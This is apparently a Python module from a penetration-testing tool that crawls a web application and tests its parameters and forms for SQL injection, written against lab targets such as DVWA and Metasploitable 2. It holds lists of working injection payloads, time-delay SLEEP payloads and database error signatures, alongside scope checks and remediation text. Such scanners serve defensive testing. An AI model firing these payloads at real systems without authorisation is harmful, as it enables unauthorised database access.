# AutoPen SQL Injection Scanner
# Uses crawler output - no hardcoded paths
# Own detection logic - not SQLMap wrapper
# Detects error-based and boolean-based SQLi

import requests
import time
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich import box
from modules.recon.crawler import WebCrawler

console = Console()

# ─────────────────────────────────────────────
# OUR OWN PAYLOAD LIBRARY
# ─────────────────────────────────────────────

ERROR_BASED_PAYLOADS = [
    "'",
    "''",
    "`",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "') OR ('1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
]

BOOLEAN_BASED_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("' OR 'x'='x", "' OR 'x'='y"),
]

DB_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch_array()",
    "mysql_num_rows()",
    "supplied argument is not a valid mysql",
    "mysql server version for the right syntax",
    "pg_query()",
    "postgresql query failed",
    "microsoft sql native client error",
    "odbc sql server driver",
    "unclosed quotation mark after the character string",
    "ora-01756",
    "ora-00933",
    "sql syntax",
    "syntax error",
    "unexpected end of sql command",
    "invalid query",
    "sql error",
    "database error",
]

BLIND_SQLI_PAYLOADS = [
    # Time-based blind SQLi — DVWA low security uses GET with id param
    # Use 3 second sleep for clear signal on slow VMs
    ("1 AND SLEEP(3)--", 3.0),
    ("1' AND SLEEP(3)--", 3.0),
    ("1 AND SLEEP(3)#", 3.0),
    ("' AND SLEEP(3)--", 3.0),
    ("1 AND SLEEP(3)", 3.0),
]


def is_valid_injection_target(url: str, param: str) -> bool:
    """
    Filter out URLs that are not real injection targets.
    Reduces false positives significantly.
    """
    url_lower = url.lower()

    # Skip PHP info pages - they respond differently to any input
    if 'phpinfo' in url_lower:
        return False

    # Skip empty parameter names
    if not param or param.strip() == '':
        return False

    # Skip static file parameters
    skip_extensions = ['.jpg', '.png', '.gif', '.css', '.js', '.ico']
    for ext in skip_extensions:
        if ext in url_lower:
            return False

    # Skip logout pages
    if 'logout' in url_lower:
        return False

    # Skip file inclusion parameters that are just page names
    # These change page content normally - not SQLi
    if param == 'page' and 'mutillidae' in url_lower:
        return False

    return True
    
def is_internal_target(url: str, target_ip: str) -> bool:
    """
    Ensure we only test our actual authorized target.
    Blocks external domains from being tested.
    """
    from urllib.parse import urlparse
    try:
        parsed = urlparse(url)
        host = parsed.hostname or ''
        if not host:
            return False
        return host == target_ip or host.endswith(target_ip)
    except Exception:
        return False

class SQLiScanner:
    def __init__(self, config: dict, logger, validator):
        self.target_ip = config['target']['host']
        self.base_url = f"http://{self.target_ip}"
        self.target_url = config['target']['url']
        self.username = config['target'].get('username')
        self.password = config['target'].get('password')
        self.timeout = config['scan']['timeout']
        self.logger = logger
        self.validator = validator
        self.findings = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': config['scan']['user_agent']
        })
        self.config = config

    def run(self, crawl_results=None) -> list:
        """Main SQLi scan function"""
        console.print(Panel(
            "[bold red]PHASE 3: SQL INJECTION DETECTION[/bold red]\n"
            f"Target: [bold white]{self.target_ip}[/bold white]\n"
            "Crawling target then testing discovered parameters...",
            style="red"
        ))

        if not self.validator.is_host_in_scope(self.target_ip):
            console.print("[bold red]Target out of scope. Scan blocked.[/bold red]")
            return []

        # Authentication is handled by the shared session in main.py if provided

        # Run crawler to discover targets automatically
        if crawl_results is None:
            console.print("\n[cyan]Starting web crawler...[/cyan]")
            crawler = WebCrawler(self.config, self.logger, self.session)
            crawl_results = crawler.run()
        else:
            console.print("\n[cyan]Using shared crawler results.[/cyan]")

        get_params = crawl_results['get_params']
        forms = crawl_results['forms']

        if not get_params and not forms:
            console.print("[yellow]No injectable parameters or forms discovered.[/yellow]")
            return []

        # Test all discovered GET parameters
        if get_params:
            console.print(f"\n[cyan]Testing {len(get_params)} discovered GET parameters...[/cyan]")
            for target in get_params:
                # Skip invalid targets - reduces false positives
                if not is_internal_target(target['url'], self.target_ip):
                    continue
                if not is_valid_injection_target(target['url'], target['param']):
                    continue
                console.print(f"\n[cyan]Testing:[/cyan] {target['url'][-60:]}")
                console.print(f"[cyan]Parameter:[/cyan] {target['param']}")
                self._run_error_based_scan(target['url'], target['param'])
                self._run_boolean_based_scan(target['url'], target['param'])

        # Test all discovered forms
        if forms:
            console.print(f"\n[cyan]Testing {len(forms)} discovered forms...[/cyan]")
            for form in forms:
               if not is_internal_target(form['action'], self.target_ip):
                    continue
               for input_field in form['inputs']:
                    if input_field['type'] not in ['password', 'hidden']:
                        console.print(f"\n[cyan]Testing form:[/cyan] {form['action'][-60:]}")
                        console.print(f"[cyan]Field:[/cyan] {input_field['name']}")
                        self._run_error_based_scan(
                            form['action'],
                            input_field['name'],
                            method=form['method'],
                            form_data={i['name']: i['value'] for i in form['inputs']}
                        )

        # Direct testing removed

        self._display_results()
        return self.findings

    # DVWA specific methods removed

    def _run_error_based_scan(self, url: str, param: str,
                               method: str = 'GET', form_data: dict = None):
        """
        Error-based SQLi detection.
        Our own logic - checks for DB error signatures.
        """
        console.print(f"  [yellow]→ Error-based ({len(ERROR_BASED_PAYLOADS)} payloads)[/yellow]")
        found = False

        with Progress(
            SpinnerColumn(),
            TextColumn("[cyan]Testing {task.completed}/{task.total}[/cyan]"),
            BarColumn(),
            transient=True
        ) as progress:
            task = progress.add_task("scanning", total=len(ERROR_BASED_PAYLOADS))

            for payload in ERROR_BASED_PAYLOADS:
                if found:
                    break
                try:
                    if method == 'GET':
                        params = {param: payload}
                        response = self.session.get(
                            url,
                            params=params,
                            timeout=self.timeout
                        )
                    else:
                        data = form_data.copy() if form_data else {}
                        data[param] = payload
                        response = self.session.post(
                            url,
                            data=data,
                            timeout=self.timeout
                        )

                    self.logger.log_request(method, url, response.status_code)
                    response_lower = response.text.lower()

                    for signature in DB_ERROR_SIGNATURES:
                        if signature in response_lower:
                            finding = self._create_finding(
                                vuln_type='Error-Based SQL Injection',
                                url=url,
                                parameter=param,
                                payload=payload,
                                evidence=(
                                    f"DB error signature: '{signature}'\n"
                                    f"Payload: {payload}\n"
                                    f"Response length: {len(response.text)} bytes"
                                )
                            )
                            self.findings.append(finding)
                            self.logger.log_finding('Error-Based SQLi', url, 'HIGH')
                            console.print(
                                f"  [bold red]✗ VULNERABLE[/bold red] — Error-based SQLi!\n"
                                f"  [red]Payload:[/red] {payload}\n"
                                f"  [red]Trigger:[/red] {signature}"
                            )
                            found = True
                            break

                    time.sleep(0.1)

                except Exception as e:
                    self.logger.log_error('error_based_scan', str(e))

                progress.advance(task)

        if not found:
            console.print(f"  [green]✓ No error-based SQLi[/green]")

    def _run_boolean_based_scan(self, url: str, param: str):
        """
        Boolean-based SQLi detection.
        Compare true vs false condition responses.
        """
        console.print(f"  [yellow]→ Boolean-based ({len(BOOLEAN_BASED_PAYLOADS)} pairs)[/yellow]")
        found = False

        for true_payload, false_payload in BOOLEAN_BASED_PAYLOADS:
            if found:
                break
            try:
                true_resp = self.session.get(
                    url,
                    params={param: true_payload},
                    timeout=self.timeout
                )
                time.sleep(0.1)
                false_resp = self.session.get(
                    url,
                    params={param: false_payload},
                    timeout=self.timeout
                )

                diff = abs(len(true_resp.text) - len(false_resp.text))

                if diff > 50:
                    finding = self._create_finding(
                        vuln_type='Boolean-Based SQL Injection',
                        url=url,
                        parameter=param,
                        payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                        evidence=(
                            f"Response length difference: {diff} bytes\n"
                            f"TRUE response:  {len(true_resp.text)} bytes\n"
                            f"FALSE response: {len(false_resp.text)} bytes"
                        )
                    )
                    self.findings.append(finding)
                    self.logger.log_finding('Boolean-Based SQLi', url, 'HIGH')
                    console.print(
                        f"  [bold red]✗ VULNERABLE[/bold red] — Boolean-based SQLi!\n"
                        f"  [red]Difference:[/red] {diff} bytes"
                    )
                    found = True

                time.sleep(0.1)

            except Exception as e:
                self.logger.log_error('boolean_based_scan', str(e))

        if not found:
            console.print(f"  [green]✓ No boolean-based SQLi[/green]")

    def _create_finding(self, vuln_type: str, url: str,
                        parameter: str, payload: str, evidence: str) -> dict:
        """Structured finding object for consistent reporting"""
        return {
            'title': f"{vuln_type} in parameter '{parameter}'",
            'type': 'sqli',
            'vuln_type': vuln_type,
            'target': url,
            'parameter': parameter,
            'payload': payload,
            'severity': 'HIGH',
            'cvss_score': 8.8,
            'description': (
                f"{vuln_type} detected. The '{parameter}' parameter does not "
                f"properly sanitize user input, allowing SQL query manipulation."
            ),
            'evidence': evidence,
            'remediation': (
                "1. Use parameterized queries or prepared statements.\n"
                "2. Implement input validation and whitelist allowed characters.\n"
                "3. Apply least privilege to database accounts.\n"
                "4. Enable WAF rules for SQLi protection.\n"
                "5. Never expose database errors to end users."
            ),
            'references': [
                'https://owasp.org/www-community/attacks/SQL_Injection',
                'CWE-89: Improper Neutralization of Special Elements in SQL Command'
            ],
            'discovered_at': datetime.now().isoformat()
        }

    def _run_blind_sqli_scan(self, url: str, param: str):
        """
        Boolean-based blind SQLi detection.
        DVWA sqli_blind on Metasploitable 2 does not delay on SLEEP()
        so time-based detection fails. Boolean-based works because:
        TRUE condition  → returns user data (longer response)
        FALSE condition → returns nothing (shorter response)
        """
        console.print(
            f"  [yellow]→ Blind SQLi boolean-based (4 pairs)[/yellow]"
        )
        found = False

        BOOLEAN_BLIND_PAIRS = [
            ("1 AND 1=1", "1 AND 1=2"),
            ("1 AND 1=1--", "1 AND 1=2--"),
            ("1' AND '1'='1", "1' AND '1'='2"),
            ("1 AND 'x'='x", "1 AND 'x'='y"),
        ]

        for true_payload, false_payload in BOOLEAN_BLIND_PAIRS:
            if found:
                break
            try:
                true_resp = self.session.get(
                    url,
                    params={param: true_payload},
                    timeout=self.timeout
                )
                time.sleep(0.3)
                false_resp = self.session.get(
                    url,
                    params={param: false_payload},
                    timeout=self.timeout
                )

                diff = abs(len(true_resp.text) - len(false_resp.text))

                if diff > 20:
                    finding = self._create_finding(
                        vuln_type='Boolean-Based Blind SQL Injection',
                        url=url,
                        parameter=param,
                        payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                        evidence=(
                            f"Boolean-based blind SQLi detected.\n"
                            f"TRUE condition response:  {len(true_resp.text)} bytes\n"
                            f"FALSE condition response: {len(false_resp.text)} bytes\n"
                            f"Difference: {diff} bytes\n"
                            f"TRUE payload:  {true_payload}\n"
                            f"FALSE payload: {false_payload}"
                        )
                    )
                    self.findings.append(finding)
                    self.logger.log_finding('Blind SQLi', url, 'HIGH')
                    console.print(
                        f"  [bold red]✗ VULNERABLE[/bold red] — Blind SQLi!\n"
                        f"  [red]TRUE response:[/red] {len(true_resp.text)} bytes\n"
                        f"  [red]FALSE response:[/red] {len(false_resp.text)} bytes\n"
                        f"  [red]Difference:[/red] {diff} bytes"
                    )
                    found = True

                time.sleep(0.2)

            except Exception as e:
                self.logger.log_error('blind_sqli', str(e))

        if not found:
            console.print(f"  [green]✓ No blind SQLi detected[/green]")
    def _display_results(self):
        """Display SQLi findings"""
        console.print(f"\n[bold white]SQLi Scan Complete.[/bold white]")

        if not self.findings:
            console.print("[bold green]✓ No SQL injection vulnerabilities found.[/bold green]")
            return

        table = Table(
            title="SQL Injection Findings",
            box=box.ROUNDED,
            style="red"
        )
        table.add_column("Type", style="bold white", width=35)
        table.add_column("Parameter", style="cyan", width=15)
        table.add_column("Severity", style="bold red", width=10)
        table.add_column("CVSS", style="bold", width=6)

        for f in self.findings:
            table.add_row(
                f['vuln_type'],
                f['parameter'],
                f['severity'],
                str(f['cvss_score'])
            )

        console.print(table)
        console.print(f"[bold red]Total SQLi Findings: {len(self.findings)}[/bold red]")
